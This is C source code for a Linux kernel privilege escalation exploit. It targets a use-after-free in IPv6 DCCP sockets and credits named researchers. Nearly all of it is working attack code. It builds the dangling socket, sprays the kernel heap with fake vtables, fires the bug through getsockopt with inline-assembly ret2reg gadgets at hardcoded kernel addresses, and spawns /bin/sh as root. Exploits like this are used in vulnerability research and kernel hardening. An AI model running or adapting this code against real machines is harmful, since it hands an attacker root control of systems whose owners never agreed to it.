/*
#######   CREDITS  ############
Mohamed Ghannam
*/
/*
 * exploit written by ww9210
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <assert.h>
#include <sys/mman.h>
#include <keyutils.h>
#include "libexp.h"

#define SOL_DCCP 269
#define CRASH_IP 0xffffffff8125de59
#define SPRAY_NUM 0x100

/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

void __attribute__((constructor)) _ret2reg_init() {
    signal(SIGSEGV, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{

    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov rcx, %0;"
            "mov rdi, [rcx+8*0];"
            "mov rsi, [rcx+8*1];"
            "mov rdx, [rcx+8*2];"
            "mov r10, [rcx+8*3];"
            "mov r8, [rcx+8*4];"
            "mov r9, [rcx+8*5];"

                        "mov rbp, 0xffffffff81000be9;"
                        "mov r12, 0xffffffff8244ab00;"
                        "mov r13, 0xffffffff810d0ad0;"
                        "mov r14, 0xffffffff81021c3c;"
                        "mov r9, 0xffffffff81c00164;"

            "mov rax, 55;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(_args));
}

void _trigger(int num_args, ...)
{
    va_list ap;
    va_start(ap, num_args);
    for(int i=0; i<num_args; i++) {
        _args[_arg_num++] = va_arg(ap, unsigned long);
    }
    va_arg(ap, unsigned long);
    va_end(ap);

    __asm__(".intel_syntax noprefix;"
            "call __trigger;"
            ".att_syntax;");
    _arg_num = 0;
    if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ret2reg_trigger(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/

int fd1, fd2;
struct sockaddr_in6 in1, in2;
char payload[0x10];

int free_fd;
struct sockaddr_in6 free_cin;

char *addr;
int do_uaf()
{
	struct sockaddr_in6 cin1, cin2;
	int ret;

	fd1 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	if(fd1<0){
		perror("socket");
	}

	memset(&in1,0,sizeof(in1));
	in1.sin6_family = AF_INET6;
	in1.sin6_addr = in6addr_loopback;
	in1.sin6_port = 0x214e;//htons(0x1000);
	ret=bind(fd1,(struct sockaddr*)&in1,sizeof(in1));
	if(ret<0){
		perror("bind");
	}
	ret=listen(fd1,0x1);
	if(ret<0){
		perror("listen");
	}

	fd2 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	if(fd2<0){
		perror("socket");
	}

	memset(&cin1,0,sizeof(cin1));
	cin1.sin6_family = AF_INET6;
	cin1.sin6_addr = in6addr_loopback;
	cin1.sin6_port = 0x214e;//htons(0x1000);
	cin1.sin6_flowinfo = 0;
	ret=connect(fd2,(struct sockaddr*)&cin1,sizeof(cin1));
	if(fd2<0){
		perror("socket");
	}

	memset(&cin2,0,sizeof(cin2));
	ret=connect(fd1,(struct sockaddr*)&cin2,sizeof(cin2));
	if(ret<0){
		perror("connect");
	}
	memset(&in2,0,sizeof(in2));

	in2.sin6_family = AF_INET6;
	in2.sin6_addr = in6addr_loopback;
	in2.sin6_port = htons(0x6f0);
	in2.sin6_flowinfo = 0x2;
	in2.sin6_scope_id = 6;
	ret=bind(fd2,(struct sockaddr*)&in2,sizeof(in2));
	if(ret<0){
		perror("bind");
	}

	struct sockaddr_in6 cin3;
	memset(&cin3,0,sizeof(cin3));
	ret=connect(fd2,(struct sockaddr*)&cin3,sizeof(cin3));
	if(ret<0){
		perror("connect");
	}

	ret=listen(fd2,0xb1);
	if(ret<0){
		perror("listen");
	}

	struct sockaddr_in6 cin4;
	memset(&cin4,0,sizeof(cin4));
	cin4.sin6_family = AF_INET6;
	cin4.sin6_port = htons(0x6f0);//htons(0x3000);
	memset(&cin4.sin6_addr,0,sizeof(struct in6_addr));
	cin4.sin6_flowinfo = 1;
	cin4.sin6_scope_id = 0x32f1;
	ret=connect(fd1,(struct sockaddr*)&cin4,sizeof(cin4));
	if(ret<0){
		perror("connect");
	}
	return fd2;
}

void prepare_free()
{
	int fd1, fd2;
	struct sockaddr_in6 in1, in2;
	struct sockaddr_in6 cin1, cin2;
	int ret;

	memset(&in1,0,sizeof(in1));

	fd1 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);

	in1.sin6_family = AF_INET6;
	in1.sin6_addr = in6addr_loopback;
	in1.sin6_port = 0x214f;//htons(0x1000);

	// fd1 bind and listen
	ret=bind(fd1,(struct sockaddr*)&in1,sizeof(in1));
	ret=listen(fd1, 0x1);

	// fd2 connects to fd1
	fd2 = socket(AF_INET6, SOCK_DCCP, IPPROTO_IP);
	memset(&cin1,0,sizeof(cin1));
	cin1.sin6_family = AF_INET6;
	cin1.sin6_addr = in6addr_loopback;
	cin1.sin6_port = 0x214f;//htons(0x1000);
	cin1.sin6_flowinfo = 0;
	ret=connect(fd2,(struct sockaddr*)&cin1,sizeof(cin1));

	// fd1 is binding, connect fd1
	memset(&cin2,0,sizeof(cin2));
	//ret=connect(fd1,(struct sockaddr*)&cin2,sizeof(cin2));

	free_fd = fd1;
	free_cin = cin2;
}

u64 _get_mem_size(void)
{
    FILE *f = fopen("/proc/meminfo", "r");
    char *line_buf = NULL;
    char *buf;
    size_t n;

    assert(f != NULL);

    if(getline(&line_buf, &n, f) < 0) {
        free(line_buf);
        goto out;
    }
    buf = strstr(line_buf, ":") + 1;
    fclose(f);
    return atoll(buf) * 1024;

out:
    puts("fail to read memory size");
    fclose(f);
    return -1;
}

void payload_setup()
{
	// setup fake ops
	u64 upper_limit = _get_mem_size() & (~0xfff);
    u64 kaddr = 0xffff880000000000 + upper_limit/4*3;
    kaddr &= 0xfffffffffffff000;
    printf("kaddr: %#llx\n", kaddr);
	long *ptr = (long *)payload;
	// ptr[0] = FAKE_OPS;
	ptr[0] = kaddr;
	ptr[1] = 0;

	u64 fake_vtable[0x20];
	for(int i=0; i<0x20; i++) fake_vtable[i] = CRASH_IP;

	for(int i=0;i<upper_limit/0x1000/4;i++) {
        void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        memcpy(addr, fake_vtable, 0x100);
    }

	prepare_free();
}

void hook(void *addr)
{
	sleep(2);
}

struct spray_struct *spray;
void context_setup()
{
	init_univ_spray();
	spray = prepare_univ_spray(payload, 0xf, SPRAY_NUM, hook);
}

void do_spray(void)
{
	// the initial freelist is victim->stuff, free an extra objec to make it
	// padding->victim->stuff
	// connect(free_fd, (struct sockaddr*)&free_cin, sizeof(free_cin));
	// add_key_desc_spray_num(payload, 0x200);
	univ_spray(spray);
}

int main(void)
{
	payload_setup();
	context_setup();

	int val = 0x4142;
	socklen_t l=sizeof(val);

	do_uaf();
	// nonsense();

	do_spray();

	// syscall that dereference the dangling pointer
	// getsockopt(fd2, SOL_DCCP, 130, (void*)0x41424344, &l);
	ret2reg_trigger(fd2, SOL_DCCP, 130, (void*)0x41424344, &l);

	return 0;
}
